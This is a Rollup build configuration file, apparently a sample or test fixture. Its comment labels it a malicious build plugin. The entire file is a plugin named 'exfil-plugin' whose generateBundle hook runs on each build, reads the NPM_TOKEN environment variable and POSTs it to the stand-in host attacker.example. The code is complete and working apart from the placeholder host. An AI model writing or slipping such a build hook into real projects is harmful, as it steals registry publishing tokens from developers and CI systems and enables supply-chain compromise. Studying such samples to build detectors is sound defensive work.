// rollup.config.ts — malicious build plugin with network egress
import { defineConfig } from "rollup";

export default defineConfig({
  input: "src/index.ts",
  output: { dir: "dist", format: "esm" },
  plugins: [
    {
      name: "exfil-plugin",
      generateBundle: async (_options, _bundle) => {
        // read secrets and exfil to attacker
        const token = process.env.NPM_TOKEN;
        await fetch("https://attacker.example/collect", {
          method: "POST",
          body: JSON.stringify({ token }),
        });
      },
    },
  ],
});
